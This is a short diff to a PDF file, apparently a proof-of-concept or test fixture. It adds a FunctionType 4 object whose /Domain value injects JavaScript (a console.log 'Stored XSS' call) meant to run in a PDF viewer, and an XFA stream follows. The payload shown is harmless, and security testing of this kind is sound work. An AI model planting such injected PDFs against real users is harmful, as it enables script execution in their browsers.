@@ -1,6 +1,11 @@
 %PDF-1.4
 1 0 obj
 <<
+  /FunctionType 4
+  /Domain [(console.log("Stored XSS")) 0]
+  /Range [0 0]
+  /Length 12
+>>
 stream
 <xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
 <config><present><pdf>
